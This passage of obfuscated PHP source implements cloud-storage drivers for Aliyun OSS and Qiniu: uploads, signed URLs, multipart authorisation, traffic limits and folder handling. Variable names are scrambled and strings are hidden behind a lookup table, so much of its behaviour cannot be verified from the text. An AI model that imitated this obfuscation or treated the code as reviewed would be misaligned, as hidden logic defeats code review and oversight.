$Ü®ÿ≈˘Á)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ãõÔ™ãÖ), $ƒœ¬∂–æ); } catch (OSS\Core\OssException $Ë≥„ö€ò) { $this->writeLog(__FUNCTION__ . $éùõ„πÖ[224] . $Ë≥„ö€ò->getMessage()); return !1; } return !0; } public function getContent($Ü€≤µ√¥) { return $this->fileSubstr($Ü€≤µ√¥, -1); } public function setContent($°«’˘˙¥, $ìáå—Çö = '') { $æ—˙Îûû =& $_SERVER[ˆë€Ï⁄∂]; try { $ÈÏ‚Å‰Ë = $this->trafficLimit($æ—˙Îûû[1502]); $ÛÈòÇ£ñ = $this->client->putObject($this->bucket, $this->pathEncode($°«’˘˙¥), $ìáå—Çö, $ÈÏ‚Å‰Ë); } catch (OSS\Core\OssException $‹∏ä«¡„) { $this->writeLog(__FUNCTION__ . $æ—˙Îûû[224] . $‹∏ä«¡„->getMessage()); return !1; } $Ü¿æ∫¶¯ = array($æ—˙Îûû[1496] => trim($ÛÈòÇ£ñ[$æ—˙Îûû[1493]], $æ—˙Îûû[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°«’˘˙¥))); $this->updateObjMeta($°«’˘˙¥, $Ü¿æ∫¶¯); return isset($ÛÈòÇ£ñ[$æ—˙Îûû[1503]][$æ—˙Îûû[305]]) ? !0 : !1; } private function updateObjMeta($û ±ÿ·…, $ëƒ˘ßƒ€) { $û ±ÿ·… = $this->pathEncode($û ±ÿ·…); try { $¬¢âã«õ = array(OSS\OssClient::OSS_HEADERS => $ëƒ˘ßƒ€); $this->client->copyObject($this->bucket, $û ±ÿ·…, $this->bucket, $û ±ÿ·…, $¬¢âã«õ); } catch (OSS\Core\OssException $ ”¶ù◊˝) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $ ”¶ù◊˝->getMessage()); return !1; } return !0; } public function upload($æ◊à…‡´, $ÿ”˝Âßú, $÷∆∫‰˜— = false, $÷ÛûüˆÂ = REPEAT_REPLACE) { $¯Ãä≠’¥ =& $_SERVER[ˆë€Ï⁄∂]; $ç ¡¨üî = trim($æ◊à…‡´, $¯Ãä≠’¥[8]); $ﬂÆüÑﬂ¸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¯Ãä≠’¥[1496] => @md5_file($ÿ”˝Âßú)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($æ◊à…‡´))); $ﬂÆüÑﬂ¸ = $this->trafficLimit($¯Ãä≠’¥[1502], $ﬂÆüÑﬂ¸); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ç ¡¨üî), $ÿ”˝Âßú, $ﬂÆüÑﬂ¸); } catch (OSS\Core\OssException $õêÈ⁄˘ß) { $this->writeLog(__FUNCTION__ . $¯Ãä≠’¥[224] . $õêÈ⁄˘ß->getMessage()); return !1; } return $this->getPathOuter($æ◊à…‡´); } public function getHost() { $˛íÆÛÌ¸ =& $_SERVER[ˆë€Ï⁄∂]; $Œºπä°° = explode($˛íÆÛÌ¸[220], parent::getHost()); return $Œºπä°°[0] . $˛íÆÛÌ¸[220] . $this->bucket . $˛íÆÛÌ¸[10] . $Œºπä°°[1]; } public function uploadFormData($“ ˝õß¿, $∫œÛ§Î¥ = 3600) { $˘‡±´∞— =& $_SERVER[ˆë€Ï⁄∂]; if (!($⁄˜‹ß±Ë = $this->getHost())) { return !1; } $ıß¬ß»≠ = $∫œÛ§Î¥; $ê˙ŸˆÛÕ = date($˘‡±´∞—[1504], time() + $ıß¬ß»≠); $ö¸∑Ä‹◊ = new DateTime($ê˙ŸˆÛÕ); $æ–ïäñ› = $ö¸∑Ä‹◊->format(DateTime::ISO8601); $ëÔâÀ∫é = strpos($æ–ïäñ›, $˘‡±´∞—[382]); $æ–ïäñ› = substr($æ–ïäñ›, 0, $ëÔâÀ∫é) . $˘‡±´∞—[1505]; $ó–√™˜¯ = 1048576000 * 5; $ØåÙ∂Ò” = $this->pathFather($“ ˝õß¿); $ÜÚ˜“Ï» = array($˘‡±´∞—[274] => $æ–ïäñ›, $˘‡±´∞—[277] => array(array($˘‡±´∞—[1506], 0, $ó–√™˜¯), array($˘‡±´∞—[279], $˘‡±´∞—[280], $ØåÙ∂Ò”))); $›Ò≤‡¶É = base64_encode(json_encode($ÜÚ˜“Ï»)); $ﬁ‚–∞≈¶ = base64_encode(hash_hmac($˘‡±´∞—[1427], $›Ò≤‡¶É, $this->secret, !0)); $‹µ‡ Œ” = array($˘‡±´∞—[1507] => $this->accessKey, $˘‡±´∞—[289] => $›Ò≤‡¶É, $˘‡±´∞—[282] => $˘‡±´∞—[273], $˘‡±´∞—[1508] => $ﬁ‚–∞≈¶, $˘‡±´∞—[218] => $⁄˜‹ß±Ë); $‹µ‡ Œ” = $this->trafficLimit($˘‡±´∞—[1502], $‹µ‡ Œ”, !0); return $‹µ‡ Œ”; } public function uploadMultiData($Ö˙ú¬»ü, $“Ñ”ß¡Œ = 3600) { $≥§⁄íÍÒ =& $_SERVER[ˆë€Ï⁄∂]; if (!($Ë°«Û≈∆ = $this->getHost())) { return !1; } $Û⁄ÎùÛ— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ö˙ú¬»ü)); return array($≥§⁄íÍÒ[293] => $Û⁄ÎùÛ—, $≥§⁄íÍÒ[218] => $Ë°«Û≈∆ . $≥§⁄íÍÒ[8] . $this->pathEncode($Ö˙ú¬»ü), $≥§⁄íÍÒ[294] => gmdate($≥§⁄íÍÒ[1509]), $≥§⁄íÍÒ[107] => $Ö˙ú¬»ü); } public function uploadMultiAuth($⁄ÓøË¡∫, $ìøÀ‹áÍ = array()) { if (isset($ìøÀ‹áÍ[$_SERVER[ˆë€Ï⁄∂][295]])) { return $this->uploadPartAuth($⁄ÓøË¡∫, $ìøÀ‹áÍ); } return $this->uploadListAuth($⁄ÓøË¡∫, $ìøÀ‹áÍ); } private function uploadPartAuth($ãÀÏüô∏, $˝Ëﬂøû¶ = array()) { $á¬¡ˆ‰Å =& $_SERVER[ˆë€Ï⁄∂]; $ù¯çõÅí = $˝Ëﬂøû¶[$á¬¡ˆ‰Å[107]]; $≠≥ﬂªÌÍ = $this->_getUploadAuth($ù¯çõÅí, $˝Ëﬂøû¶); $° ƒÀ‘ﬁ = array($á¬¡ˆ‰Å[297] => $≠≥ﬂªÌÍ[$á¬¡ˆ‰Å[297]], $á¬¡ˆ‰Å[294] => $≠≥ﬂªÌÍ[$á¬¡ˆ‰Å[294]]); if (isset($≠≥ﬂªÌÍ[$á¬¡ˆ‰Å[1510]])) { $° ƒÀ‘ﬁ[$á¬¡ˆ‰Å[1510]] = $≠≥ﬂªÌÍ[$á¬¡ˆ‰Å[1510]]; } return $° ƒÀ‘ﬁ; } private function uploadListAuth($æóªóì¸, $Ô£Ë≠’å = array()) { $Ù˙Ò≤Ú´ =& $_SERVER[ˆë€Ï⁄∂]; $ß˙®≤‰⁄ = $Ô£Ë≠’å[$Ù˙Ò≤Ú´[107]]; $∂˝’ûêÎ = $Ô£Ë≠’å[$Ù˙Ò≤Ú´[293]]; $ôêÄ∑Á≈ = $this->client->listParts($this->bucket, $this->pathEncode($ß˙®≤‰⁄), $∂˝’ûêÎ); $”µÃÈ› = $ôêÄ∑Á≈->getListPart(); $ÅéòÚ˛ô = array(); foreach ($”µÃÈ› as $ºﬁ»Òá◊) { $ÅéòÚ˛ô[] = array($Ù˙Ò≤Ú´[308] => $ºﬁ»Òá◊->getPartNumber(), $Ù˙Ò≤Ú´[309] => trim($ºﬁ»Òá◊->getETag(), $Ù˙Ò≤Ú´[131])); } if (!$ÅéòÚ˛ô) { return !1; } $»˚§ı®˚ = $this->_getUploadAuth($ß˙®≤‰⁄, $Ô£Ë≠’å); return array($Ù˙Ò≤Ú´[297] => $»˚§ı®˚[$Ù˙Ò≤Ú´[297]], $Ù˙Ò≤Ú´[294] => $»˚§ı®˚[$Ù˙Ò≤Ú´[294]], $Ù˙Ò≤Ú´[300] => $ÅéòÚ˛ô); } private function _getUploadAuth($ã◊§Ô€õ, $£ÿ‘‰˛≈) { $ﬁà·ª˚ =& $_SERVER[ˆë€Ï⁄∂]; $Ì«˘±Æ = gmdate($ﬁà·ª˚[1509]); $÷“◊‚¶ç = isset($£ÿ‘‰˛≈[$ﬁà·ª˚[295]]) ? $ﬁà·ª˚[265] : $ﬁà·ª˚[299]; $Ü™¨±ÁÏ = array_intersect_key($£ÿ‘‰˛≈, array_flip(array($ﬁà·ª˚[295], $ﬁà·ª˚[293]))); ksort($Ü™¨±ÁÏ); $◊àÖíÉæ = $Ü™¨±ÁÏ ? $ﬁà·ª˚[86] . http_build_query($Ü™¨±ÁÏ, null, $ﬁà·ª˚[296], PHP_QUERY_RFC3986) : $ﬁà·ª˚[12]; $ÿ¬àΩ≤¿ = array($÷“◊‚¶ç, $ﬁà·ª˚[12], $ﬁà·ª˚[133], $Ì«˘±Æ, "\x78\x2d\x6f\163\163\x2d\144\x61\164\x65\x3a{$Ì«˘±Æ}", $ﬁà·ª˚[8] . $this->bucket . $ﬁà·ª˚[8] . $ã◊§Ô€õ . $◊àÖíÉæ); if (isset($£ÿ‘‰˛≈[$ﬁà·ª˚[295]])) { $€≠–åäú = $this->trafficLimit($ﬁà·ª˚[1502], array(), !0); if ($€≠–åäú) { $ã◊§Ô€õ = $ﬁà·ª˚[1510]; array_splice($ÿ¬àΩ≤¿, 5, 0, $ã◊§Ô€õ . $ﬁà·ª˚[4] . $€≠–åäú[$ã◊§Ô€õ]); } } $ÂºÅŸ˚ﬂ = implode($ﬁà·ª˚[59], $ÿ¬àΩ≤¿); $û…õ«§‡ = base64_encode(hash_hmac($ﬁà·ª˚[1427], $ÂºÅŸ˚ﬂ, $this->secret, !0)); $¯‚æ çÊ = $ﬁà·ª˚[1479] . $this->accessKey . $ﬁà·ª˚[4] . $û…õ«§‡; $≠«Ïƒˆ = array($ﬁà·ª˚[297] => $¯‚æ çÊ, $ﬁà·ª˚[294] => $Ì«˘±Æ); if (!empty($€≠–åäú)) { $≠«Ïƒˆ = array_merge($≠«Ïƒˆ, $€≠–åäú); } return $≠«Ïƒˆ; } public function download($ÚÀß≈ÖÔ, $Ö «ëïß) { $ı’Îﬂ≤Ò =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isFolder($ÚÀß≈ÖÔ)) { return !1; } try { $¡Ÿ˜·˚Â = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ö «ëïß); $¡Ÿ˜·˚Â = $this->trafficLimit($ı’Îﬂ≤Ò[122], $¡Ÿ˜·˚Â); $this->client->getObject($this->bucket, $this->pathEncode($ÚÀß≈ÖÔ), $¡Ÿ˜·˚Â); } catch (OSS\Core\OssException $˜·‰µÊÁ) { $this->writeLog(__FUNCTION__ . $ı’Îﬂ≤Ò[224] . $˜·‰µÊÁ->getMessage()); return !1; } return $Ö «ëïß; } public function fileSubstr($æ”≤‚∫…, $˝»˜◊™Ä = 0, $¶Çù»πœ = false) { if ($˝»˜◊™Ä === -1) { $∆ª€∏ÉÄ = array(); } else { if ($¶Çù»πœ === !1) { $Å‰Ω€¸„ = $this->size($æ”≤‚∫…); } else { $Å‰Ω€¸„ = $˝»˜◊™Ä + $¶Çù»πœ - 1; } $∆ª€∏ÉÄ = array(OSS\OssClient::OSS_RANGE => "{$˝»˜◊™Ä}\x2d{$Å‰Ω€¸„}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($æ”≤‚∫…), $∆ª€∏ÉÄ); } catch (OSS\Core\OssException $†Öı∫“) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $†Öı∫“->getMessage()); think_exception($†Öı∫“->getMessage()); return !1; } } private function trafficLimit($ÄØÂ±ß…, $ç≤¶¸¶ = array(), $†ÊÑŒ·É = false) { $Œ≤Óëó˛ =& $_SERVER[ˆë€Ï⁄∂]; if ($ÄØÂ±ß… == $Œ≤Óëó˛[1502] && $this->isUploadServer() || $ÄØÂ±ß… == $Œ≤Óëó˛[122] && $this->isFileOutServer()) { return $ç≤¶¸¶; } $‹ñâ˜€‰ = floatval($GLOBALS[$Œ≤Óëó˛[6]][$Œ≤Óëó˛[102]][$Œ≤Óëó˛[120]][$ÄØÂ±ß…]) * 1024 * 1024 * 8; if (!$‹ñâ˜€‰) { return $ç≤¶¸¶; } $‹ñâ˜€‰ = $‹ñâ˜€‰ < 819200 ? 819200 : ($‹ñâ˜€‰ > 838860800 ? 838860800 : $‹ñâ˜€‰); if ($†ÊÑŒ·É) { $ç≤¶¸¶[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‹ñâ˜€‰); } else { if (!isset($ç≤¶¸¶[OSS\OssClient::OSS_HEADERS])) { $ç≤¶¸¶[OSS\OssClient::OSS_HEADERS] = array(); } $ç≤¶¸¶[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‹ñâ˜€‰); } return $ç≤¶¸¶; } public function link($ßÑ ¿Æû, $ëè÷õÂä = array()) { $ÇÂçƒ≤ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->exist($ßÑ ¿Æû) || $this->isFolder($ßÑ ¿Æû)) { return !1; } try { $ëè÷õÂä = $this->trafficLimit($ÇÂçƒ≤[122], $ëè÷õÂä, !0); $ ˘˜Í˜‚ = $this->client->signUrl($this->bucket, $this->pathEncode($ßÑ ¿Æû), 3600 * 12, $ÇÂçƒ≤[1511], $ëè÷õÂä); return $this->getCdnLink($ ˘˜Í˜‚); } catch (OSS\Core\OssException $òËœ«ãˆ) { $this->writeLog(__FUNCTION__ . $ÇÂçƒ≤[224] . $òËœ«ãˆ->getMessage()); return !1; } } public function fileOut($†ñøøµ◊, $•û¸º≤ë = false, $∂õ»àÖÒ = false, $™≤ï◊õì = '') { $—≥≈ÛπÊ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isFileOutServer()) { return $this->fileOutServer($†ñøøµ◊, $•û¸º≤ë, $∂õ»àÖÒ, $™≤ï◊õì); } if (!$∂õ»àÖÒ) { $∂õ»àÖÒ = $this->pathThis($†ñøøµ◊); } $∂õ»àÖÒ = rawurlencode($∂õ»àÖÒ); $™˚ì©áè = get_file_mime(get_path_ext($∂õ»àÖÒ)); if ($™˚ì©áè == $—≥≈ÛπÊ[260]) { return parent::fileOut($†ñøøµ◊, $•û¸º≤ë, $∂õ»àÖÒ, $™≤ï◊õì); } $•û¸º≤ë = $•û¸º≤ë ? $—≥≈ÛπÊ[1512] : $—≥≈ÛπÊ[1513]; $¢©ÖÙµÓ = array(OSS\OssClient::OSS_SUB_RESOURCE => $—≥≈ÛπÊ[1514] . rawurlencode("{$•û¸º≤ë}\73\x66\x69\154\x65\x6e\x61\155\x65\x3d{$∂õ»àÖÒ}")); $¢©ÖÙµÓ[OSS\OssClient::OSS_SUB_RESOURCE] .= $—≥≈ÛπÊ[1515] . rawurlencode($™˚ì©áè); $á™Ë˝∞µ = $this->link($†ñøøµ◊, $¢©ÖÙµÓ); $this->fileOutLink($á™Ë˝∞µ); } public function fileOutServer($º¢íõìÇ, $ù¥◊úÌ® = false, $ü‰‘˚ùÏ = false, $Œë™˝âü = '') { parent::fileOut($º¢íõìÇ, $ù¥◊úÌ®, $ü‰‘˚ùÏ, $Œë™˝âü); } public function fileOutImage($∑˘¸”ôÒ, $„∏ØÌÉÚ = 250) { if ($this->size($∑˘¸”ôÒ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($∑˘¸”ôÒ, $„∏ØÌÉÚ); } $Ÿ≤¬…˙ç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ˆë€Ï⁄∂][1476] . $„∏ØÌÉÚ); $Ωöıè—ô = $this->link($∑˘¸”ôÒ, $Ÿ≤¬…˙ç); $this->fileOutLink($Ωöıè—ô); } public function fileOutImageServer($äµ˙öøê, $°Ù“Øƒ· = 250) { parent::fileOutImage($äµ˙öøê, $°Ù“Øƒ·); } public function fileOutLink($ÿºÕˆÆÀ) { $óÅ¨∞©’ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->isCdnHost() && substr($ÿºÕˆÆÀ, 0, 7) == $óÅ¨∞©’[228]) { $ÿºÕˆÆÀ = $óÅ¨∞©’[229] . substr($ÿºÕˆÆÀ, 7); } header($óÅ¨∞©’[185] . $ÿºÕˆÆÀ); die; } public function hashMd5($åßøË›ª, $ôß» ù° = '') { $ûÄÜÂŒÑ =& $_SERVER[ˆë€Ï⁄∂]; $√∫ïôèÙ = $this->_objectMeta($åßøË›ª); if (!$√∫ïôèÙ) { return $ûÄÜÂŒÑ[12]; } if (!isset($√∫ïôèÙ[$ûÄÜÂŒÑ[1496]]) && !empty($ôß» ù°)) { $ìúúÀ∆Ú = $this->updateObjMeta($åßøË›ª, array($ûÄÜÂŒÑ[1496] => $ôß» ù°)); $√∫ïôèÙ[$ûÄÜÂŒÑ[1496]] = $ìúúÀ∆Ú ? $ôß» ù° : $ûÄÜÂŒÑ[12]; } return isset($√∫ïôèÙ[$ûÄÜÂŒÑ[1496]]) ? strtolower($√∫ïôèÙ[$ûÄÜÂŒÑ[1496]]) : $ûÄÜÂŒÑ[12]; } public function size($Îô¨›Çø) { $◊’î©ï© = $this->objectMeta($Îô¨›Çø); return $◊’î©ï© ? $◊’î©ï©[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function info($°ÙÅµ˙Õ) { if ($this->isFolder($°ÙÅµ˙Õ)) { return $this->folderInfo($°ÙÅµ˙Õ); } else { if ($this->isFile($°ÙÅµ˙Õ)) { return $this->fileInfo($°ÙÅµ˙Õ); } } return !1; } public function exist($Ù¡–å‰») { return $this->isFile($Ù¡–å‰») || $this->isFolder($Ù¡–å‰»); } public function isFile($»å‹ÿôå) { return !$this->isFolder($»å‹ÿôå) && $this->objectMeta($»å‹ÿôå); } public function isFolder($æ¿÷¨Ôﬂ) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][189], $æ¿÷¨Ôﬂ); } protected function objectMeta($”√˝–æì) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][191], $”√˝–æì); } protected function _objectMeta($û≥ﬂ÷Ú€) { $å¸»˝Áï =& $_SERVER[ˆë€Ï⁄∂]; try { $◊í…¯µø = $this->client->getObjectMeta($this->bucket, $this->pathEncode($û≥ﬂ÷Ú€)); } catch (OSS\Core\OssException $Ûø˛ä—è) { $this->writeLog(__FUNCTION__ . $å¸»˝Áï[224] . $Ûø˛ä—è->getMessage()); $◊í…¯µø = !1; } if ($◊í…¯µø) { $◊í…¯µø[$å¸»˝Áï[89]] = intval($◊í…¯µø[$å¸»˝Áï[1494]]); } return $◊í…¯µø; } protected function _isFolder($¡£ìä»Â) { $ÖË÷≤€ù =& $_SERVER[ˆë€Ï⁄∂]; if ($¡£ìä»Â == $ÖË÷≤€ù[12] || $¡£ìä»Â == $ÖË÷≤€ù[8]) { return !0; } $ª÷∫ï˘ç = array($ÖË÷≤€ù[1489] => $ÖË÷≤€ù[8], $ÖË÷≤€ù[1490] => rtrim($¡£ìä»Â, $ÖË÷≤€ù[8]) . $ÖË÷≤€ù[8], $ÖË÷≤€ù[1491] => 1, $ÖË÷≤€ù[1492] => $ÖË÷≤€ù[12]); $ãª…¨∏£ = $this->client->listObjects($this->bucket, $ª÷∫ï˘ç); if ($ãª…¨∏£->getObjectList() || $ãª…¨∏£->getPrefixList()) { return !0; } return !1; } public function writeLog($§ƒõñÒ— = '', $≈”ô˝∫· = false) { $∏∂óìôË =& $_SERVER[ˆë€Ï⁄∂]; $£ììœü˜ = in_array(ACTION, array($∏∂óìôË[222], $∏∂óìôË[223])); if (!$£ììœü˜ && !GLOBAL_DEBUG) { return; } $⁄‘ã¬”Œ = 0; if (stripos($§ƒõñÒ—, $∏∂óìôË[1516]) !== !1) { $⁄‘ã¬”Œ = 1; $ÌÎ˛Ò«ø = explode($∏∂óìôË[1517], $§ƒõñÒ—); $§ƒõñÒ— = !empty($ÌÎ˛Ò«ø[1]) ? $ÌÎ˛Ò«ø[1] : $§ƒõñÒ—; } else { if (stripos($§ƒõñÒ—, $∏∂óìôË[1518])) { $⁄‘ã¬”Œ = 2; $ÌÎ˛Ò«ø = explode($∏∂óìôË[1518], $§ƒõñÒ—); $ÌÎ˛Ò«ø = explode($∏∂óìôË[4], $ÌÎ˛Ò«ø[0]); $§ƒõñÒ— = !empty($ÌÎ˛Ò«ø[1]) ? $ÌÎ˛Ò«ø[1] : $§ƒõñÒ—; } } if ($£ììœü˜ && I18n::getType() == $∏∂óìôË[1519]) { if ($⁄‘ã¬”Œ == 1) { $§ƒõñÒ— = str_replace($∏∂óìôË[1520], $∏∂óìôË[1521], $§ƒõñÒ—); } else { if ($⁄‘ã¬”Œ == 2) { $ÌÎ˛Ò«ø = explode($∏∂óìôË[224], $ÌÎ˛Ò«ø[0]); $‹¶„†∂å = isset($ÌÎ˛Ò«ø[1]) ? $ÌÎ˛Ò«ø[1] : $∏∂óìôË[12]; $ÏˆËÓ⁄¸ = array($∏∂óìôË[1522] => $∏∂óìôË[1523], $∏∂óìôË[1524] => $∏∂óìôË[1525], $∏∂óìôË[1526] => $∏∂óìôË[1527], $∏∂óìôË[1528] => $∏∂óìôË[1529], $∏∂óìôË[1530] => $∏∂óìôË[1531], $∏∂óìôË[1532] => $∏∂óìôË[1533], $∏∂óìôË[1534] => $∏∂óìôË[1535], $∏∂óìôË[1536] => $∏∂óìôË[1537], $∏∂óìôË[1538] => $∏∂óìôË[1539], $∏∂óìôË[1540] => $∏∂óìôË[1541]); if (isset($ÏˆËÓ⁄¸[$‹¶„†∂å])) { $§ƒõñÒ— = $ÏˆËÓ⁄¸[$‹¶„†∂å]; } } } if (stripos($§ƒõñÒ—, $∏∂óìôË[1542])) { $§ƒõñÒ— = $∏∂óìôË[1543]; } } if (!trim($§ƒõñÒ—)) { return; } parent::writeLog(trim($§ƒõñÒ—), $≈”ô˝∫·); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($•ìü∑æ›) { parent::__construct(); require_once SDK_DIR . $_SERVER[ˆë€Ï⁄∂][1544]; $this->_init($•ìü∑æ›); } public function _init($Ö˙öüàá) { $ÿΩô’Úõ =& $_SERVER[ˆë€Ï⁄∂]; $this->config = $Ö˙öüàá; foreach ($Ö˙öüàá as $çöï‚Òé => $˝£öë≤„) { if (isset($this->{$çöï‚Òé})) { $this->{$çöï‚Òé} = $˝£öë≤„; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÿΩô’Úõ[1545] . LNG($ÿΩô’Úõ[1480])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($†Êç–Æä, $˜Ë£ú©î = '', $òì£·ÛÏ = REPEAT_RENAME) { if ($this->setContent($†Êç–Æä, $˜Ë£ú©î)) { return $this->getPathOuter($†Êç–Æä); } return !1; } public function mkdir($ñ¢»‚∞à, $ùªÛâñÎ = REPEAT_SKIP) { $ÒÏß·ü  =& $_SERVER[ˆë€Ï⁄∂]; $…¿∑ó⁄º = trim($ñ¢»‚∞à, $ÒÏß·ü [8]); if ($this->_isFolder($…¿∑ó⁄º)) { return $this->getPathOuter($…¿∑ó⁄º); } $ñ¢»‚∞à = $…¿∑ó⁄º . $ÒÏß·ü [8]; $ÏØ–É¶® = get_path_this($…¿∑ó⁄º); $ä¿—îàû = $ñ¢»‚∞à . $ÏØ–É¶®; if (!$this->mkfile($ä¿—îàû)) { return !1; } if (!$this->moveFile($ä¿—îàû, $ñ¢»‚∞à)) { $this->delFile($ä¿—îàû); return !1; } return $this->getPathOuter($…¿∑ó⁄º); } public function copyFile($¿◊˛≥¡≤, $ç¸êóºø) { $˚ó∞ﬁ≥É = $this->bucketManager->copy($this->bucket, $¿◊˛≥¡≤, $this->bucket, $ç¸êóºø, !0); return $˚ó∞ﬁ≥É ? !1 : $this->getPathOuter($ç¸êóºø); } public function moveFile($ı√∏˜†Õ, $‰ÁãÇﬁá) { $ÿüò±Çë = $this->bucketManager->move($this->bucket, $ı√∏˜†Õ, $this->bucket, $‰ÁãÇﬁá, !0); return $ÿüò±Çë ? !1 : $this->getPathOuter($‰ÁãÇﬁá); } public function delFile($ó®¢ΩÈè) { if (!$this->exist($ó®¢ΩÈè)) { return !0; } $¥¯øåÒ© = $this->bucketManager->delete($this->bucket, $ó®¢ΩÈè); if (!$¥¯øåÒ©) { return !0; } return $¥¯øåÒ©->code() == 612 ? !0 : !1; } public function delFolder($¯±ü”œÜ) { $™õ¿™–‹ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->exist($¯±ü”œÜ)) { return !0; } $this->listItemCache = !1; $íÛ“ôÃ™ = $this->fileList($¯±ü”œÜ); $this->listItemCache = !0; $¬⁄ü˚›¶ = trim($¯±ü”œÜ, $™õ¿™–‹[8]) . $™õ¿™–‹[8]; if (!empty($¯±ü”œÜ) && $¯±ü”œÜ !== $™õ¿™–‹[240] && !in_array($¬⁄ü˚›¶, $íÛ“ôÃ™[$™õ¿™–‹[95]])) { $íÛ“ôÃ™[$™õ¿™–‹[95]][] = $¬⁄ü˚›¶; } $’ª˝∑”÷ = $this->delByBatch($íÛ“ôÃ™[$™õ¿™–‹[96]]); if (!$’ª˝∑”÷) { return !1; } $’ª˝∑”÷ = $this->delByBatch($íÛ“ôÃ™[$™õ¿™–‹[95]]); if (!$’ª˝∑”÷) { return !1; } return $this->delFile($¬⁄ü˚›¶); } private function delByBatch($†ËÊ»ØÜ) { foreach (array_chunk($†ËÊ»ØÜ, 1000) as $˘£Ù’ò) { $ˆı˘˘è = $this->bucketManager->buildBatchDelete($this->bucket, $˘£Ù’ò); list($…˛ªùû„, $¡–º÷˝Ñ) = $this->bucketManager->batch($ˆı˘˘è); if ($¡–º÷˝Ñ) { return !1; } } return !0; } public function rename($˛œåÛÿÔ, $ß°∂€´ü) { return $this->renameObject($˛œåÛÿÔ, $ß°∂€´ü); } public function fileInfo($Ê»£ﬁ‹¶, $ò√ªÎˆÎ = false, $ß¸Ä˛…¢ = array()) { $É´´ñÎÂ =& $_SERVER[ˆë€Ï⁄∂]; $óäÁÈ∫Ú = array($É´´ñÎÂ[32] => $this->pathThis($Ê»£ﬁ‹¶), $É´´ñÎÂ[97] => $this->getPathOuter($É´´ñÎÂ[8] . $Ê»£ﬁ‹¶), $É´´ñÎÂ[33] => $É´´ñÎÂ[242], $É´´ñÎÂ[89] => isset($ß¸Ä˛…¢[$É´´ñÎÂ[1546]]) ? $ß¸Ä˛…¢[$É´´ñÎÂ[1546]] : 0, $É´´ñÎÂ[179] => $this->ext($Ê»£ﬁ‹¶)); if ($ò√ªÎˆÎ) { return $óäÁÈ∫Ú; } $óäÁÈ∫Ú[$É´´ñÎÂ[243]] = $óäÁÈ∫Ú[$É´´ñÎÂ[98]] = 0; $óäÁÈ∫Ú[$É´´ñÎÂ[244]] = $óäÁÈ∫Ú[$É´´ñÎÂ[245]] = !0; if (empty($ß¸Ä˛…¢)) { $ß¸Ä˛…¢ = $this->objectMeta($Ê»£ﬁ‹¶); if (!$ß¸Ä˛…¢) { return $óäÁÈ∫Ú; } } if (isset($ß¸Ä˛…¢[$É´´ñÎÂ[246]]) && $ß¸Ä˛…¢[$É´´ñÎÂ[246]]) { $óäÁÈ∫Ú[$É´´ñÎÂ[247]] = $ß¸Ä˛…¢[$É´´ñÎÂ[246]]; } if (isset($ß¸Ä˛…¢[$É´´ñÎÂ[257]]) && $ß¸Ä˛…¢[$É´´ñÎÂ[257]]) { $óäÁÈ∫Ú[$É´´ñÎÂ[247]] = $ß¸Ä˛…¢[$É´´ñÎÂ[257]]; } if (isset($ß¸Ä˛…¢[$É´´ñÎÂ[1547]])) { $óäÁÈ∫Ú[$É´´ñÎÂ[98]] = substr($ß¸Ä˛…¢[$É´´ñÎÂ[1547]] . $É´´ñÎÂ[12], 0, 10); } if (isset($ß¸Ä˛…¢[$É´´ñÎÂ[1546]])) { $óäÁÈ∫Ú[$É´´ñÎÂ[89]] = $ß¸Ä˛…¢[$É´´ñÎÂ[1546]]; } return $óäÁÈ∫Ú; } public function folderInfo($¥§ÎÁ·∏, $∞Æüú˛è = false) { $∞è’∂Ô˛ =& $_SERVER[ˆë€Ï⁄∂]; $à˜πﬂªƒ = array($∞è’∂Ô˛[32] => $this->pathThis($¥§ÎÁ·∏), $∞è’∂Ô˛[97] => $this->getPathOuter($∞è’∂Ô˛[8] . $¥§ÎÁ·∏), $∞è’∂Ô˛[33] => $∞è’∂Ô˛[88]); if ($∞Æüú˛è) { return $à˜πﬂªƒ; } $à˜πﬂªƒ[$∞è’∂Ô˛[243]] = $à˜πﬂªƒ[$∞è’∂Ô˛[98]] = 0; $à˜πﬂªƒ[$∞è’∂Ô˛[244]] = $à˜πﬂªƒ[$∞è’∂Ô˛[245]] = !0; $¥§ÎÁ·∏ = rtrim($¥§ÎÁ·∏, $∞è’∂Ô˛[8]) . $∞è’∂Ô˛[8]; $›Ì˙Å√ƒ = $this->objectMeta($¥§ÎÁ·∏); if (isset($›Ì˙Å√ƒ[$∞è’∂Ô˛[1547]])) { 